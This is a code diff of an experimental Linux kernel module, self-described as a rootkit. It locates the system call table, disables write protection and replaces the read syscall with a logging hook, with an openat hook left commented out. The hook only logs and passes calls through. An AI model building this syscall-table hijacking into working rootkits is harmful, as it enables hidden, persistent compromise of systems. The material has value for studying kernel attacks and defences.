@@ -25,47 +25,51 @@ MODULE_AUTHOR("Khan");
 MODULE_DESCRIPTION("TOTALLY NOT A ROOTKIT");
 
 static unsigned long *sys_call_table;
-static typeof(sys_read) *orig_read;
+static typeof(sys_read)* real_read;
+//static typeof(sys_openat)* real_openat;
 
-asmlinkage long phony_read(int fd, char __user *buf, size_t count) {
+asmlinkage long totallyReal_read(int fd, char __user *buf, size_t count) {
 	pr_info("Intercepted read of fd=%d, %lu byes\n", fd, count);
-	
-	return orig_read(fd, buf, count);
+	return real_read(fd, buf, count);
 }
 
-/*
-asmlinkage int fakeMkdir(const char __user *pathname, umode_t mode){
+/*asmlinkage int totallyReal_mkdir(const char __user *pathname, umode_t mode){
 	pr_info("fakeMkdir called!");
 	return oldNR(pathname, mode);
+}
+
+asmlinkage totallyReal_openat(int dirfd, const char *pathname, int flags, mode_t mode){
+	pr_info("openAt called (mkdir?) path:%s\n", pathname);
+	return real_openat(dirfd, pathname, flags, mode);
 }
 */
 
 int __init loadMod(void){
 	sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");
-	
 	if (sys_call_table == NULL){
 		pr_info("sys_call_table not found using kallsyms\n");
 		return -1;
 	}
+
 	pr_info("module loaded\n");
 	pr_info("sys_call_table pointer is %p\n", sys_call_table);
 
 	//pr_info("sys_read is of type %s\n", (typeof(sys_read)).name());
 	pr_info("original read in sys_call_table shown as %p\n", sys_call_table[__NR_read]);
 
-	orig_read = (typeof(sys_read) *)sys_call_table[__NR_read];
-	pr_info("original read stored as %p\n", (void*) orig_read);
+	real_read = (typeof(sys_read) *)sys_call_table[__NR_read];
+	pr_info("original read stored as %p\n", (void*) real_read);
 	
 	
 	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = (void *) &phony_read;
+		sys_call_table[__NR_read] = (void *) &totallyReal_read;
 	});
 	pr_info("sys_call_table injected with phony_read ptr:%p\n", (void *)sys_call_table[__NR_read]);
 
 	/* immediately restores ptr. If uncommented, rootkit is stable (but doesn't work)
 
 	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = (void *) orig_read;
+		sys_call_table[__NR_read] = (void *) real_read;
 	});
 	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
 
@@ -81,12 +85,13 @@ int __init loadMod(void){
 
 void __exit unloadMod(void){
 	CR0_WRITE_UNLOCK({
-		sys_call_table[__NR_read] = (void *) orig_read;
+		sys_call_table[__NR_read] = (void *) real_read;
 	});
 	pr_info("notarootkit unloading\n");
-	pr_info("sys_call_table read ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
+	pr_info("sys_call_table open ptr replaced, now as :%p\n", (void *)sys_call_table[__NR_read]);
 	return;
 }
 
 module_init(loadMod);
 module_exit(unloadMod);
+
